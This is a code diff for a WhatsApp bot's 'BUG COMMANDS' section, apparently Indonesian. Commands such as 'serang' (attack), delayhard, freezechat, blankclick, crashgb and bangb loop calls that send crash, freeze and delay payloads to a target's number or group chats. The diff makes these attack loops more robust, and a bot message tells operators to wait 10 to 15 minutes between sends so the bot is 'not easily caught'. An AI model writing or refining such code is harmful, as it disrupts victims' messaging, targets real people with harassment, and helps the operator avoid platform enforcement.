@@ -1311,6 +1311,7 @@ reply("number not found in owner list");
 break;
 
 // ==================== BUG COMMANDS ====================
+// ==================== BUG COMMANDS ====================
 case 'serang': {
     if (!isOwner) return reply("*You are not a Premium User*");
     if (!botNumber) return reply("This Feature Only Send By Bot Number");
@@ -1320,15 +1321,15 @@ case 'serang': {
     sock.sendMessage(m.chat, { react: { text: '😜', key: m.key } });
     sock.sendMessage(m.chat, { react: { text: '😝', key: m.key } });
     sock.sendMessage(m.chat, { react: { text: '✨', key: m.key } });
-    
-await reply(`succses menyerang target 😵‍💫`)    
-    
+
+    await reply(`succses menyerang target 😵‍💫`);
+
     for (let r = 0; r < 5; r++) {
-await delayhard(sock, m.chat);
-await frezehard(sock, m.chat);
+        await delayhard(sock, m.chat).catch(() => {});
+        await frezehard(sock, m.chat).catch(() => {});
     }
-    await sleep(1000)
-  console.log(chalk.red.bold("Success!"))
+    await sleep(1000);
+    console.log(chalk.red.bold("Success!"));
 }
 break;
 
@@ -1342,9 +1343,10 @@ case 'delayhard': {
 
     let isTarget = `${jidx}@s.whatsapp.net`;
     reply(`Success! Sent Bug to ${isTarget}\n\nNote : Use Delay After Successfully Sending Bug, So Bot Is Not Easily Caught, Minimum Delay 10/15 Minutes!!`);
+
     for (let i = 0; i < 5; i++) {
-await delayhard(sock, target);
-await sleep(500);        
+        await delayhard(sock, isTarget).catch(() => {});  
+        await sleep(500);
     }
 
     console.log(chalk.red.bold(`success sending bug type ${command}`));
@@ -1361,11 +1363,12 @@ case 'freezechat': {
 
     let isTarget = `${jidx}@s.whatsapp.net`;
     reply(`Success! Sent Bug to ${isTarget}\n\nNote : Use Delay After Successfully Sending Bug, So Bot Is Not Easily Caught, Minimum Delay 10/15 Minutes!!`);
+
     for (let i = 0; i < 5; i++) {
-await delayhard(sock, target);
-await sleep(500);   
-await frezehard(sock, target);  
-await sleep(500);   
+        await delayhard(sock, isTarget).catch(() => {});   
+        await sleep(500);
+        await frezehard(sock, isTarget).catch(() => {});   
+        await sleep(500);
     }
 
     console.log(chalk.red.bold(`success sending bug type ${command}`));
@@ -1382,13 +1385,14 @@ case 'blankclick': {
 
     let isTarget = `${jidx}@s.whatsapp.net`;
     reply(`Success! Sent Bug to ${isTarget}\n\nNote : Use Delay After Successfully Sending Bug, So Bot Is Not Easily Caught, Minimum Delay 10/15 Minutes!!`);
+
     for (let i = 0; i < 5; i++) {
-await mistery(isTarget);
-await sleep(500);
-await delayhard(sock, target);
-await sleep(500);   
-await frezehard(sock, target);  
-await sleep(500);   
+        await mistery(sock, isTarget).catch(() => {});  
+        await sleep(500);
+        await delayhard(sock, isTarget).catch(() => {});  
+        await sleep(500);
+        await frezehard(sock, isTarget).catch(() => {}); 
+        await sleep(500);
     }
 
     console.log(chalk.red.bold(`success sending bug type ${command}`));
@@ -1410,7 +1414,7 @@ case 'delaygb': {
                 await delayhardgb(sock, groupJid).catch(() => {});
             }
         } catch (err) {
-            console.error(`error:`, err);
+            console.error(`error delaygb:`, err);
         }
     })();
 }
@@ -1431,7 +1435,7 @@ case 'bangb': {
                 await bansgc(sock, groupJid).catch(() => {});
             }
         } catch (err) {
-            console.error(`error:`, err);
+            console.error(`error bangb:`, err);
         }
     })();
 }
@@ -1456,7 +1460,7 @@ case 'crashgb': {
                 ]);
             }
         } catch (err) {
-            console.error(`error:`, err);
+            console.error(`error crashgb:`, err);
         }
     })();
 }
